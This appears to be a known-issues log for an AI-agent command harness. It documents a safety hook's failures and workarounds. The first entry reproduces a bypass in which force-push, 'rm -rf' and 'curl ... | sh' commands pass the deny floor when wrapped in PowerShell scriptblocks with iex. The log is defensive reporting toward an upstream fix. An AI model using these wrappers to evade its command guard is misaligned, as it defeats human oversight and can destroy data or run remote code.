command_or_target: dispatch.check() on PowerShell scriptblock-wrapped charter commands
failure: The vendored floor denies a charter command bare but ALLOWS the same command wrapped in any of three PowerShell one-liner shapes, so it contradicts its own verdict. Reproduced locally at tier 3 against .claude/hooks/dispatch.py 1.5.2 with three payloads (git push --force origin main; rm -rf /critical/outside; curl -sL https://x.sh | sh): all 9 wrapped combinations returned allow while all 3 bare forms and all 3 bare-iex forms returned deny. Shapes: if ($true) { iex '...' }; Where-Object { $_ -match 'x' -and (iex '...') }; ForEach-Object { $x += iex '...' }. Root cause is upstream: a scriptblock body is program text but the floor inspects it in only two call sites and only as one command. Pre-existing, not a NavSentinel regression; also present on the globally installed 1.5.3.
workaround: Branch protection is NOT the mitigation. AI-17 covers only the 'git push --force' class; a wrapped 'rm -rf' outside the project and a wrapped download piped to a shell are unaffected, so 6 of the 9 demonstrated combinations stay host-destructive even after AI-17 is complete. Until a fixed canonical floor lands the only real controls are operator-side: do not run unreviewed PowerShell one-liners containing iex/Invoke-Expression; treat any scriptblock-wrapped command as UNGUARDED regardless of the floor's verdict; prefer plain non-wrapped commands so the floor can see them. Do not rely on the floor to catch a destructive command inside 'if (...) { }', 'Where-Object { }', or a compound assignment. Do not patch the vendored copy locally: it is synced verbatim from canonical.
future_fix: Owned upstream by agent-harness issue #37 (reproduction evidence and a version-agnostic repro script posted there 2026-07-24). When a canonical floor release closes #37, sync it into .claude/hooks/dispatch.py the same way v1.5.1 (#467) and v1.5.2 (#469) were, and re-run the repro to confirm all wrapped shapes deny.

surface: vendored deny floor / Bash git plumbing
failure: Read-only git plumbing is denied as '[floor 1.5.2] An unknown git alias/subcommand is opaque to the deny floor.' The floor allowlists known subcommands and denies the rest, but rev-list, merge-tree, check-ignore, cat-file, for-each-ref and similar are documented read-only plumbing that cannot mutate anything. Costs a round trip and can push an agent from a safe probe toward a mutating operation.
workaround: Use allowed equivalents, but note they are ONE-SIDED: 'git log --oneline main..<branch>' lists only commits the branch has and main lacks, so it cannot by itself distinguish 'up to date' from 'behind'. For a two-sided answer run BOTH directions -- 'git log --oneline main..<branch>' (ahead) and 'git log --oneline <branch>..main' (behind) -- or use 'git branch --contains <sha>' / 'git branch --merged main' for reachability. Do not treat a single empty log range as an ahead/behind equivalent; a stale branch looks current that way. Do not create a real worktree or merge just to answer a question a read-only probe would have answered.
future_fix: Owned upstream by agent-harness issue #34 (extend the known-subcommand set with read-only plumbing). Arrives in this repo with the next canonical floor sync.

failure: A gh --body argument whose markdown contains an inline code span is denied when the span happens to hold something the floor recognises (an environment assignment, a force-push, a path). The floor parses into what it reads as command substitution and matches on the contents, so severity scales with what the prose quotes - it fires hardest exactly when an agent documents floor behaviour. This is the failure mode the harness blueprint names explicitly: never scan PR-body or commit-message text.
workaround: Write the body to a file under the session scratchpad and use --body-file. Used successfully for the agent-harness #37 write-up on 2026-07-24. Prefer --body-file unconditionally for any gh comment/PR body containing markdown code spans.
future_fix: Owned upstream by agent-harness issue #36 (honour POSIX backslash escaping inside double-quoted spans before command-substitution detection). Arrives with the next canonical floor sync.

surface: npm run agent:hooks:smoke / vendored floor matrix
failure: 'FAIL - deny floor matrix (canonical): Command [...python, .claude/hooks/smoke_test.py] timed out after 120 seconds'. The vendored floor's own smoke suite no longer fits the 120s subprocess budget that scripts/agent_hooks/smoke_test.py allows it: run directly it exceeded 420s on this machine without finishing. Consequence is that 'npm run agent:hooks:smoke' exits non-zero even though all 12 other checks pass, so the mandated pre-handoff check cannot currently go green here. Pre-existing and not diff related: verified that the branch recording this touches no file under .claude/ ('git diff main...HEAD --name-only -- .claude/' is empty), so the floor and its smoke fixture are byte-identical to main. Machine load from concurrent agent work may contribute, but a 3.5x overshoot of the budget is not explained by load alone; the vendored suite grew to ~1600 cases across the 1.5.x syncs.
workaround: Read the FULL smoke output, never a tail. This failure prints near the TOP of the run, so 'npm run agent:hooks:smoke | tail -3' shows only trailing 'ok -' lines and looks green while the command exits 1 -- that is exactly how it was missed for most of the 2026-07-24 session. Redirect to a file and grep for '^FAIL', and check the exit code. The other 12 checks (settings/Codex/MCP JSON, hook shape, PreToolUse wiring, PostToolUse context and alternate worktree path, failure redaction, SessionStart, Codex hook wiring, guided human-action contract) do still pass and remain meaningful.
future_fix: FIXED in #457 (merged 2026-07-25). The per-subtest timeout in scripts/agent_hooks/smoke_test.py was raised 120s -> 600s, with a comment recording the measurement that justifies it: the full smoke run takes ~294s on this Windows host, so 120s could never pass. 'npm run agent:hooks:smoke' now exits 0 with 15/15 checks (the count grew from 12 as #457 added deny-floor integrity, single-floor topology, and Codex wiring checks), and it is CI-enforced on ubuntu + windows by the new harness job. Note the coupling this creates: a future canonical floor sync must also bump EXPECTED_DISPATCH_SHA256, EXPECTED_SMOKE_SHA256, FLOOR_PROVENANCE and both .codex/hooks.json pins, or the drift check fails -- documented in docs/agentic/GIT_WORKFLOW.md.

surface: agent verification method / Playwright list reporter
failure: A failing E2E run was initially read as clean. Two compounding causes. (1) Playwright's list reporter prints failures as '  N failed' followed by the failed test titles UNPREFIXED, then '  M passed'; there is no 'not ok' line, so grepping for 'not ok' returns zero on a failing run and the unprefixed titles look like a slow-test listing in a tail. (2) The wrapper ended with 'echo "exit=$?"', so the backgrounded command's reported exit status was echo's 0, not Playwright's 1 -- the harness notification said 'exit code 0' for a failing run.
workaround: Write the real exit code to a FILE, not stdout: 'cmd > run.log 2>&1; echo "exit=$?" > run.exit'. Then read run.exit, and count outcomes with the reporter's actual vocabulary -- grep -cE '^\s*x [0-9]+' for failed lines and parse the '  N failed' / '  M passed' summary. Never conclude from a tail. Related: the same class of error as confirming agent:hooks:smoke green via '| tail'.
future_fix: Prefer a machine-readable reporter for agent runs (--reporter=json or line) and assert on the parsed status counts rather than scraping human output.
